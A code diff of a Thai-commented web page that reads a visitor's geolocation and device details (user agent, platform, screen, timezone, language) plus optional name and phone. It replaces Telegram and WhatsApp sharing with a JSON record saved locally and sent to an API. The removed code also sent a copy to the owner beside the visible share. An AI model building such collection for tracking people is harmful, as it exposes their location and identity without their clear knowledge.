@@ -346,39 +346,33 @@ https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.long
                 return;
             }
             
-            // สร้างข้อความที่จะส่ง (ไม่ต้องกรอกข้อมูล)
-            const message = `📍 ตำแหน่งใหม่จากลิงก์
+            // สร้างข้อมูล JSON
+            const locationData = {
+                id: Date.now(),
+                timestamp: new Date().toISOString(),
+                latitude: currentLocation.latitude,
+                longitude: currentLocation.longitude,
+                accuracy: currentLocation.accuracy,
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: {
+                    width: screen.width,
+                    height: screen.height
+                },
+                location: {
+                    googleMaps: `https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.longitude}`,
+                    coordinates: [currentLocation.longitude, currentLocation.latitude]
+                }
+            };
             
-📍 ตำแหน่ง:
-ละติจูด: ${currentLocation.latitude.toFixed(6)}
-ลองจิจูด: ${currentLocation.longitude.toFixed(6)}
-ความแม่นยำ: ${Math.round(currentLocation.accuracy)} เมตร
-
-🔗 ดูบน Google Maps:
-https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.longitude}
-
-⏰ เวลา: ${new Date().toLocaleString('th-TH')}
-
-📱 ส่งจาก: ${navigator.userAgent}`;
+            // ส่งข้อมูลเข้า JSON ทันที
+            sendToJSON(locationData);
             
-            // ส่งไป Telegram
-            const encodedMessage = encodeURIComponent(message);
-            const telegramUrl = `https://t.me/share/url?url=${encodedMessage}`;
-            
-            // ส่งไป WhatsApp
-            const whatsappUrl = `https://wa.me/?text=${encodedMessage}`;
-            
-            // แสดงตัวเลือกการส่ง
-            const choice = confirm('📍 พบตำแหน่งแล้ว!\n\nเลือกวิธีส่งข้อมูล:\n\nOK = ส่งไป Telegram\nCancel = ส่งไป WhatsApp');
-            
-            if (choice) {
-                window.open(telegramUrl, '_blank');
-            } else {
-                window.open(whatsappUrl, '_blank');
-            }
-            
-            // ส่งข้อมูลมาหาเราโดยตรง
-            sendToOwner();
+            // แสดงข้อความยืนยัน
+            alert('✅ ส่งข้อมูลเรียบร้อยแล้ว!\n\nข้อมูลตำแหน่งถูกบันทึกในระบบแล้ว');
         }
         
         function sendToOwner() {
@@ -461,20 +455,8 @@ https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.long
             })
             .catch(error => {
                 console.error('❌ เกิดข้อผิดพลาดในการส่งข้อมูล:', error);
-                // เก็บข้อมูลใน localStorage เป็น backup
-                saveToLocalStorage(data);
+                // ข้อมูลถูกเก็บใน localStorage แล้ว
             });
-        }
-        
-        function saveToLocalStorage(data) {
-            try {
-                const existingData = JSON.parse(localStorage.getItem('locationData') || '[]');
-                existingData.push(data);
-                localStorage.setItem('locationData', JSON.stringify(existingData));
-                console.log('💾 เก็บข้อมูลใน localStorage:', data);
-            } catch (error) {
-                console.error('❌ เกิดข้อผิดพลาดในการเก็บข้อมูล:', error);
-            }
         }
         
         function sendLocationData() {
@@ -492,45 +474,57 @@ https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.long
                 return;
             }
             
-            // สร้างข้อความที่จะส่ง
-            const message = `📍 ข้อมูลตำแหน่งใหม่
+            // สร้างข้อมูล JSON
+            const locationData = {
+                id: Date.now(),
+                timestamp: new Date().toISOString(),
+                latitude: currentLocation.latitude,
+                longitude: currentLocation.longitude,
+                accuracy: currentLocation.accuracy,
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: {
+                    width: screen.width,
+                    height: screen.height
+                },
+                location: {
+                    googleMaps: `https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.longitude}`,
+                    coordinates: [currentLocation.longitude, currentLocation.latitude]
+                },
+                user: {
+                    name: userName,
+                    phone: userPhone || null,
+                    message: userMessage || null
+                }
+            };
             
-👤 ชื่อ: ${userName}
-📞 เบอร์โทร: ${userPhone || 'ไม่ระบุ'}
-💬 ข้อความ: ${userMessage || 'ไม่ระบุ'}
-
-📍 ตำแหน่ง:
-ละติจูด: ${currentLocation.latitude.toFixed(6)}
-ลองจิจูด: ${currentLocation.longitude.toFixed(6)}
-ความแม่นยำ: ${Math.round(currentLocation.accuracy)} เมตร
-
-🔗 ดูบน Google Maps:
-https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.longitude}
-
-⏰ เวลา: ${new Date().toLocaleString('th-TH')}`;
-            
-            // ส่งไป Telegram
-            const encodedMessage = encodeURIComponent(message);
-            const telegramUrl = `https://t.me/share/url?url=${encodedMessage}`;
-            
-            // ส่งไป WhatsApp
-            const whatsappUrl = `https://wa.me/?text=${encodedMessage}`;
-            
-            // แสดงตัวเลือกการส่ง
-            const choice = confirm('เลือกวิธีส่งข้อมูล:\n\nOK = ส่งไป Telegram\nCancel = ส่งไป WhatsApp');
-            
-            if (choice) {
-                window.open(telegramUrl, '_blank');
-            } else {
-                window.open(whatsappUrl, '_blank');
-            }
+            // ส่งข้อมูลเข้า JSON ทันที
+            sendToJSON(locationData);
             
             // แสดงข้อความยืนยัน
-            alert('✅ ส่งข้อมูลเรียบร้อยแล้ว!\n\nข้อมูลตำแหน่งของคุณถูกส่งไปแล้ว');
+            alert('✅ ส่งข้อมูลเรียบร้อยแล้ว!\n\nข้อมูลตำแหน่งถูกบันทึกในระบบแล้ว');
             
             // ซ่อนฟอร์มและแสดงข้อมูลตำแหน่ง
             document.getElementById('userForm').style.display = 'none';
             document.getElementById('locationInfo').classList.add('show');
+        }
+        
+        function sendToJSON(data) {
+            // เก็บข้อมูลใน localStorage
+            try {
+                const existingData = JSON.parse(localStorage.getItem('locationData') || '[]');
+                existingData.push(data);
+                localStorage.setItem('locationData', JSON.stringify(existingData));
+                console.log('✅ เก็บข้อมูลใน JSON เรียบร้อย:', data);
+            } catch (error) {
+                console.error('❌ เกิดข้อผิดพลาดในการเก็บข้อมูล:', error);
+            }
+            
+            // ส่งข้อมูลไปยัง API (ถ้ามี)
+            sendToAPI(data);
         }
         
         // เปิดใช้งานเมื่อโหลดหน้าเสร็จ
